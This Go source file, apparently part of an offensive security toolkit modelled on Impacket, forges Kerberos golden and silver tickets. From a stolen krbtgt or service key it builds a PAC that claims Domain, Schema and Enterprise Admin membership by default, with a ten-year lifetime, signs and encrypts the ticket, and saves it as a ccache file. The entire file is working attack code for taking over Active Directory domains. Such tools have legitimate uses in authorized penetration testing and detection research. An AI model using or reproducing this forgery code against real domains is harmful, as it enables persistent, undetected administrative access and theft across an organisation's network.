// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package kerberos

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"time"

	gokrbasn1 "github.com/jcmturner/gofork/encoding/asn1"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/crypto"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/adtype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/etypeID"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/flags"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/keytab"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// TicketConfig holds configuration for ticket creation
type TicketConfig struct {
	// Required
	Username  string
	Domain    string
	DomainSID string

	// Key (one required)
	NTHash string // 32 hex chars
	AESKey string // 32 or 64 hex chars
	Keytab string // keytab file path (silver ticket only)

	// Optional - for silver tickets
	SPN string // Service Principal Name (e.g., cifs/dc.domain.local)

	// PAC options
	UserID         uint32   // Default: 500 (Administrator)
	PrimaryGroupID uint32   // Default: 513 (Domain Users)
	Groups         []uint32 // Default: 513, 512, 520, 518, 519
	ExtraSIDs      []string // Additional SIDs to include
	ExtraPAC       bool     // include UPN_DNS_INFO in PAC
	OldPAC         bool     // exclude PAC_ATTRIBUTES + PAC_REQUESTOR

	// Ticket options
	Duration int // Hours, default: 87600 (10 years)
	KVNO     int // Key version number, default: 2
}

// TicketResult contains the generated ticket
type TicketResult struct {
	Ticket     []byte
	SessionKey []byte
	EncType    int32
	Filename   string
}

// DefaultGroups returns the default high-privilege group RIDs
func DefaultGroups() []uint32 {
	return []uint32{
		513, // Domain Users
		512, // Domain Admins
		520, // Group Policy Creator Owners
		518, // Schema Admins
		519, // Enterprise Admins
	}
}

// CreateTicket creates a golden or silver ticket
func CreateTicket(cfg *TicketConfig) (*TicketResult, error) {
	// Validate and set defaults
	if cfg.Username == "" {
		return nil, fmt.Errorf("username is required")
	}
	if cfg.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if cfg.DomainSID == "" {
		return nil, fmt.Errorf("domain-sid is required")
	}
	if cfg.NTHash == "" && cfg.AESKey == "" && cfg.Keytab == "" {
		return nil, fmt.Errorf("nthash, aesKey, or keytab is required")
	}

	// Set defaults
	if cfg.UserID == 0 {
		cfg.UserID = 500
	}
	if len(cfg.Groups) == 0 {
		cfg.Groups = DefaultGroups()
	}
	if cfg.PrimaryGroupID == 0 {
		cfg.PrimaryGroupID = cfg.Groups[0] // Match Impacket: first group in list
	}
	if cfg.Duration == 0 {
		cfg.Duration = 87600 // 10 years
	}
	if cfg.KVNO == 0 {
		cfg.KVNO = 2 // Default krbtgt KVNO
	}

	// Parse domain SID
	domainSID, err := ParseSID(cfg.DomainSID)
	if err != nil {
		return nil, fmt.Errorf("invalid domain SID: %v", err)
	}

	// Parse extra SIDs
	var extraSIDs []*SID
	for _, sidStr := range cfg.ExtraSIDs {
		sid, err := ParseSID(sidStr)
		if err != nil {
			return nil, fmt.Errorf("invalid extra SID %s: %v", sidStr, err)
		}
		extraSIDs = append(extraSIDs, sid)
	}

	// Determine encryption type and key
	var key []byte
	var encType int32

	// Try keytab first (silver ticket only)
	if cfg.Keytab != "" {
		kt, err := keytab.Load(cfg.Keytab)
		if err != nil {
			return nil, fmt.Errorf("failed to load keytab: %v", err)
		}
		// Search for matching entry, prefer AES256 > AES128 > RC4
		spnPrinc := cfg.SPN
		if spnPrinc == "" {
			spnPrinc = "krbtgt/" + strings.ToUpper(cfg.Domain)
		}
		var bestKey []byte
		var bestEType int32
		bestPriority := -1
		for _, e := range kt.Entries {
			princName := strings.Join(e.Principal.Components, "/")
			if !strings.EqualFold(princName, spnPrinc) && !strings.EqualFold(princName+"@"+e.Principal.Realm, spnPrinc+"@"+strings.ToUpper(cfg.Domain)) {
				continue
			}
			priority := 0
			switch int32(e.Key.KeyType) {
			case etypeID.AES256_CTS_HMAC_SHA1_96:
				priority = 3
			case etypeID.AES128_CTS_HMAC_SHA1_96:
				priority = 2
			case etypeID.RC4_HMAC:
				priority = 1
			default:
				continue
			}
			if priority > bestPriority {
				bestPriority = priority
				bestKey = e.Key.KeyValue
				bestEType = int32(e.Key.KeyType)
			}
		}
		if bestKey == nil {
			return nil, fmt.Errorf("no suitable key found in keytab for %s", spnPrinc)
		}
		key = bestKey
		encType = bestEType
	} else if cfg.AESKey != "" {
		keyBytes, err := hex.DecodeString(cfg.AESKey)
		if err != nil {
			return nil, fmt.Errorf("invalid AES key: %v", err)
		}
		switch len(keyBytes) {
		case 16:
			encType = etypeID.AES128_CTS_HMAC_SHA1_96
		case 32:
			encType = etypeID.AES256_CTS_HMAC_SHA1_96
		default:
			return nil, fmt.Errorf("AES key must be 16 or 32 bytes")
		}
		key = keyBytes
	} else {
		keyBytes, err := hex.DecodeString(cfg.NTHash)
		if err != nil {
			return nil, fmt.Errorf("invalid NT hash: %v", err)
		}
		if len(keyBytes) != 16 {
			return nil, fmt.Errorf("NT hash must be 16 bytes")
		}
		encType = etypeID.RC4_HMAC
		key = keyBytes
	}

	// Create times - truncate to second precision so ASN.1 GeneralizedTime
	// and PAC FILETIME timestamps are consistent (DC validates this match)
	now := time.Now().UTC().Truncate(time.Second)
	endTime := now.Add(time.Duration(cfg.Duration) * time.Hour)

	realm := strings.ToUpper(cfg.Domain)

	// Create PAC
	pac := NewPAC(cfg.Username, realm, domainSID, cfg.UserID, cfg.PrimaryGroupID, cfg.Groups)
	pac.LogonTime = now // Use the same truncated timestamp
	pac.ExtraSIDs = extraSIDs
	pac.EncType = encType
	pac.ExtraPAC = cfg.ExtraPAC
	pac.OldPAC = cfg.OldPAC

	// Marshal PAC
	pacData, err := pac.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal PAC: %v", err)
	}

	// Sign PAC
	if err := signPACInPlace(pacData, key, key, encType); err != nil {
		return nil, fmt.Errorf("failed to sign PAC: %v", err)
	}

	// Build authorization data with PAC
	authData := buildAuthorizationData(pacData)

	// Determine service name
	var sname types.PrincipalName

	if cfg.SPN != "" {
		// Silver ticket - use specified SPN
		sname = types.NewPrincipalName(2, cfg.SPN) // KRB_NT_SRV_INST
	} else {
		// Golden ticket - krbtgt service
		sname = types.NewPrincipalName(2, "krbtgt/"+realm)
	}
	renewTill := endTime

	// Generate session key
	etype, _ := crypto.GetEtype(encType)
	sessionKey, err := types.GenerateEncryptionKey(etype)
	if err != nil {
		return nil, fmt.Errorf("failed to generate session key: %v", err)
	}

	// Create EncTicketPart
	cname := types.NewPrincipalName(1, cfg.Username) // KRB_NT_PRINCIPAL

	isGolden := cfg.SPN == ""

	ticketFlags := types.NewKrbFlags()
	types.SetFlag(&ticketFlags, flags.Forwardable)
	types.SetFlag(&ticketFlags, flags.Proxiable)
	types.SetFlag(&ticketFlags, flags.Renewable)
	if isGolden {
		types.SetFlag(&ticketFlags, flags.Initial)
	}
	types.SetFlag(&ticketFlags, flags.PreAuthent)

	encTicketPart := encTicketPartASN1{
		Flags:             ticketFlags,
		Key:               encryptionKeyASN1{KeyType: sessionKey.KeyType, KeyValue: sessionKey.KeyValue},
		CRealm:            realm,
		CName:             principalNameASN1{NameType: cname.NameType, NameString: cname.NameString},
		Transited:         transitedEncodingASN1{TRType: 0, Contents: []byte{}},
		AuthTime:          now,
		StartTime:         now,
		EndTime:           endTime,
		RenewTill:         renewTill,
		AuthorizationData: authData,
	}

	// Marshal and encrypt EncTicketPart
	encPartBytes, err := gokrbasn1.Marshal(encTicketPart)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal EncTicketPart: %v", err)
	}

	// Wrap in APPLICATION 3 tag
	encPartBytes = wrapASN1App(3, encPartBytes)

	// Encrypt
	encKey := types.EncryptionKey{KeyType: encType, KeyValue: key}
	encryptedData, err := crypto.GetEncryptedData(encPartBytes, encKey, 2, cfg.KVNO) // Usage 2 = TGS-REP ticket
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt ticket: %v", err)
	}

	// Create Ticket
	ticket := ticketASN1{
		TktVNO:  5,
		Realm:   realm,
		SName:   principalNameASN1{NameType: sname.NameType, NameString: sname.NameString},
		EncPart: encryptedDataASN1{EType: encryptedData.EType, KVNO: cfg.KVNO, Cipher: encryptedData.Cipher},
	}

	ticketBytes, err := gokrbasn1.Marshal(ticket)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal ticket: %v", err)
	}
	ticketBytes = wrapASN1App(1, ticketBytes)

	// Save to ccache (replace / with . for SPN-style usernames)
	filename := strings.ReplaceAll(cfg.Username, "/", ".") + ".ccache"
	// Compute ccache ticket flags from ASN.1 BitString
	ccacheFlags := krbFlagsToCCache(ticketFlags)

	if err := saveToCCache(filename, ticketBytes, sessionKey, cname, realm, sname, now, endTime, renewTill, ccacheFlags); err != nil {
		return nil, fmt.Errorf("failed to save ccache: %v", err)
	}

	return &TicketResult{
		Ticket:     ticketBytes,
		SessionKey: sessionKey.KeyValue,
		EncType:    encType,
		Filename:   filename,
	}, nil
}

// ASN.1 structures for ticket construction
type encTicketPartASN1 struct {
	Flags             gokrbasn1.BitString   `asn1:"explicit,tag:0"`
	Key               encryptionKeyASN1     `asn1:"explicit,tag:1"`
	CRealm            string                `asn1:"generalstring,explicit,tag:2"`
	CName             principalNameASN1     `asn1:"explicit,tag:3"`
	Transited         transitedEncodingASN1 `asn1:"explicit,tag:4"`
	AuthTime          time.Time             `asn1:"generalized,explicit,tag:5"`
	StartTime         time.Time             `asn1:"generalized,explicit,optional,tag:6"`
	EndTime           time.Time             `asn1:"generalized,explicit,tag:7"`
	RenewTill         time.Time             `asn1:"generalized,explicit,optional,tag:8"`
	AuthorizationData authorizationDataASN1 `asn1:"explicit,optional,tag:10"`
}

type encryptionKeyASN1 struct {
	KeyType  int32  `asn1:"explicit,tag:0"`
	KeyValue []byte `asn1:"explicit,tag:1"`
}

type principalNameASN1 struct {
	NameType   int32    `asn1:"explicit,tag:0"`
	NameString []string `asn1:"generalstring,explicit,tag:1"`
}

type transitedEncodingASN1 struct {
	TRType   int32  `asn1:"explicit,tag:0"`
	Contents []byte `asn1:"explicit,tag:1"`
}

type authorizationDataASN1 []authorizationDataEntryASN1

type authorizationDataEntryASN1 struct {
	ADType int32  `asn1:"explicit,tag:0"`
	ADData []byte `asn1:"explicit,tag:1"`
}

type ticketASN1 struct {
	TktVNO  int               `asn1:"explicit,tag:0"`
	Realm   string            `asn1:"generalstring,explicit,tag:1"`
	SName   principalNameASN1 `asn1:"explicit,tag:2"`
	EncPart encryptedDataASN1 `asn1:"explicit,tag:3"`
}

type encryptedDataASN1 struct {
	EType  int32  `asn1:"explicit,tag:0"`
	KVNO   int    `asn1:"explicit,optional,tag:1"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

func wrapASN1App(tag int, data []byte) []byte {
	// APPLICATION tag encoding
	tagByte := byte(0x60 + tag)
	return wrapASN1(tagByte, data)
}

func wrapASN1(tag byte, data []byte) []byte {
	length := len(data)
	if length < 128 {
		return append([]byte{tag, byte(length)}, data...)
	} else if length < 256 {
		return append([]byte{tag, 0x81, byte(length)}, data...)
	} else {
		return append([]byte{tag, 0x82, byte(length >> 8), byte(length)}, data...)
	}
}

func buildAuthorizationData(pacData []byte) authorizationDataASN1 {
	// PAC is wrapped in AD-IF-RELEVANT (type 1) containing AD-WIN2K-PAC (type 128)
	pacEntry := authorizationDataEntryASN1{
		ADType: adtype.ADWin2KPAC, // 128
		ADData: pacData,
	}

	// Marshal the inner entry
	innerData, _ := gokrbasn1.Marshal([]authorizationDataEntryASN1{pacEntry})

	// Wrap in AD-IF-RELEVANT
	return authorizationDataASN1{
		{
			ADType: adtype.ADIfRelevant, // 1
			ADData: innerData,
		},
	}
}

// signPACInPlace signs the PAC data in place
func signPACInPlace(pacData, serverKey, kdcKey []byte, encType int32) error {
	// Find signature buffer offsets
	bufferCount := binary.LittleEndian.Uint32(pacData[0:4])

	var serverSigOff, kdcSigOff int
	var sigSize int

	switch encType {
	case etypeID.AES128_CTS_HMAC_SHA1_96, etypeID.AES256_CTS_HMAC_SHA1_96:
		sigSize = 12
	default:
		sigSize = 16
	}

	for i := uint32(0); i < bufferCount; i++ {
		off := 8 + i*16
		bufType := binary.LittleEndian.Uint32(pacData[off:])
		bufOffset := binary.LittleEndian.Uint64(pacData[off+8:])

		switch bufType {
		case PACTypeServerChecksum:
			serverSigOff = int(bufOffset) + 4 // Skip checksum type
		case PACTypeKDCChecksum:
			kdcSigOff = int(bufOffset) + 4
		}
	}

	// Calculate server signature
	serverSig, err := calculatePACChecksum(pacData, serverKey, encType)
	if err != nil {
		return err
	}
	copy(pacData[serverSigOff:serverSigOff+sigSize], serverSig)

	// Calculate KDC signature over server signature
	kdcSig, err := calculatePACChecksum(pacData[serverSigOff:serverSigOff+sigSize], kdcKey, encType)
	if err != nil {
		return err
	}
	copy(pacData[kdcSigOff:kdcSigOff+sigSize], kdcSig)

	return nil
}

func calculatePACChecksum(data, key []byte, encType int32) ([]byte, error) {
	switch encType {
	case etypeID.AES128_CTS_HMAC_SHA1_96, etypeID.AES256_CTS_HMAC_SHA1_96:
		// For AES, use proper key derivation - simplified for now
		return aesHmacChecksum(data, key, encType)
	default:
		return rc4HmacChecksum(data, key)
	}
}

func rc4HmacChecksum(data, key []byte) ([]byte, error) {
	// KERB_CHECKSUM_HMAC_MD5 implementation as per RFC 4757 and MS-PAC
	// Usage: 17 for PAC signatures (KERB_NON_KERB_CKSUM_SALT)
	const keyusage = 17

	// Step 1: Ksign = HMAC-MD5(key, "signaturekey\0")
	kSignMac := hmac.New(md5.New, key)
	kSignMac.Write([]byte("signaturekey\x00"))
	ksign := kSignMac.Sum(nil)

	// Step 2: MD5(usage_str(keyusage) || data)
	// usage_str for keyusage 17 is just little-endian uint32
	usageBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(usageBytes, keyusage)

	md5Hash := md5.New()
	md5Hash.Write(usageBytes)
	md5Hash.Write(data)
	tmp := md5Hash.Sum(nil)

	// Step 3: signature = HMAC-MD5(Ksign, tmp)
	sigMac := hmac.New(md5.New, ksign)
	sigMac.Write(tmp)
	return sigMac.Sum(nil), nil
}

func aesHmacChecksum(data, key []byte, encType int32) ([]byte, error) {
	// Simplified AES checksum - real impl needs key derivation
	etype, _ := crypto.GetEtype(encType)
	ck, err := etype.GetChecksumHash(key, data, 17) // Usage 17 for PAC
	if err != nil {
		return nil, err
	}
	return ck, nil
}

// krbFlagsToCCache converts ASN.1 KerberosFlags BitString to ccache uint32 flags
func krbFlagsToCCache(bf gokrbasn1.BitString) uint32 {
	var f uint32
	for i := 0; i < 32; i++ {
		if bf.At(i) != 0 {
			f |= 1 << (31 - i)
		}
	}
	return f
}

// saveToCCache saves the ticket to a ccache file
func saveToCCache(filename string, ticketBytes []byte, sessionKey types.EncryptionKey,
	cname types.PrincipalName, realm string, sname types.PrincipalName,
	authTime, endTime, renewTill time.Time, ccacheFlags uint32) error {

	var buf bytes.Buffer

	// File format version
	buf.Write([]byte{0x05, 0x04}) // Version 0x0504

	// Header (for version 4)
	// Header length
	binary.Write(&buf, binary.BigEndian, uint16(12))
	// Header tag (DeltaTime)
	binary.Write(&buf, binary.BigEndian, uint16(1))
	// Tag length
	binary.Write(&buf, binary.BigEndian, uint16(8))
	// Time offset (matches Impacket: 0xFFFFFFFF, 0x00000000)
	binary.Write(&buf, binary.BigEndian, uint32(0xFFFFFFFF))
	binary.Write(&buf, binary.BigEndian, uint32(0))

	// Default principal
	writeCCachePrincipal(&buf, cname, realm)

	// Credential
	writeCCacheCredential(&buf, ticketBytes, sessionKey, cname, realm, sname, authTime, endTime, renewTill, ccacheFlags)

	return os.WriteFile(filename, buf.Bytes(), 0600)
}

// CacheEntry holds data for a single credential entry in a ccache file.
type CacheEntry struct {
	TicketBytes []byte
	SessionKey  types.EncryptionKey
	CName       types.PrincipalName
	CRealm      string
	SName       types.PrincipalName
	SRealm      string
	AuthTime    time.Time
	EndTime     time.Time
	RenewTill   time.Time
	Flags       uint32
}

// SaveMultiCCache saves multiple credential entries to a single ccache file.
// The default principal is taken from the first entry.
func SaveMultiCCache(filename string, entries []CacheEntry) error {
	if len(entries) == 0 {
		return fmt.Errorf("no entries to save")
	}

	var buf bytes.Buffer

	// File format version 0x0504
	buf.Write([]byte{0x05, 0x04})

	// Header (DeltaTime)
	binary.Write(&buf, binary.BigEndian, uint16(12))
	binary.Write(&buf, binary.BigEndian, uint16(1))
	binary.Write(&buf, binary.BigEndian, uint16(8))
	binary.Write(&buf, binary.BigEndian, uint32(0xFFFFFFFF))
	binary.Write(&buf, binary.BigEndian, uint32(0))

	// Default principal from first entry
	writeCCachePrincipal(&buf, entries[0].CName, entries[0].CRealm)

	// Write each credential entry
	for _, e := range entries {
		writeCCacheCredential(&buf, e.TicketBytes, e.SessionKey,
			e.CName, e.CRealm, e.SName,
			e.AuthTime, e.EndTime, e.RenewTill, e.Flags)
	}

	return os.WriteFile(filename, buf.Bytes(), 0600)
}

func writeCCachePrincipal(buf *bytes.Buffer, name types.PrincipalName, realm string) {
	// Name type
	binary.Write(buf, binary.BigEndian, uint32(name.NameType))
	// Component count
	binary.Write(buf, binary.BigEndian, uint32(len(name.NameString)))
	// Realm
	binary.Write(buf, binary.BigEndian, uint32(len(realm)))
	buf.WriteString(realm)
	// Components
	for _, comp := range name.NameString {
		binary.Write(buf, binary.BigEndian, uint32(len(comp)))
		buf.WriteString(comp)
	}
}

func writeCCacheCredential(buf *bytes.Buffer, ticketBytes []byte, sessionKey types.EncryptionKey,
	cname types.PrincipalName, realm string, sname types.PrincipalName,
	authTime, endTime, renewTill time.Time, ccacheFlags uint32) {

	// Client principal
	writeCCachePrincipal(buf, cname, realm)
	// Server principal
	writeCCachePrincipal(buf, sname, realm)

	// Session key
	binary.Write(buf, binary.BigEndian, uint16(sessionKey.KeyType))
	binary.Write(buf, binary.BigEndian, uint16(0)) // EType (not used in ccache v4)
	binary.Write(buf, binary.BigEndian, uint16(len(sessionKey.KeyValue)))
	buf.Write(sessionKey.KeyValue)

	// Times
	binary.Write(buf, binary.BigEndian, uint32(authTime.Unix()))
	binary.Write(buf, binary.BigEndian, uint32(authTime.Unix())) // Start time
	binary.Write(buf, binary.BigEndian, uint32(endTime.Unix()))
	binary.Write(buf, binary.BigEndian, uint32(renewTill.Unix()))

	// Is skey (0)
	buf.WriteByte(0)

	// Ticket flags (computed dynamically from EncTicketPart flags)
	binary.Write(buf, binary.BigEndian, ccacheFlags)

	// Addresses (none)
	binary.Write(buf, binary.BigEndian, uint32(0))

	// Auth data (none)
	binary.Write(buf, binary.BigEndian, uint32(0))

	// Ticket
	binary.Write(buf, binary.BigEndian, uint32(len(ticketBytes)))
	buf.Write(ticketBytes)

	// Second ticket (none)
	binary.Write(buf, binary.BigEndian, uint32(0))
}
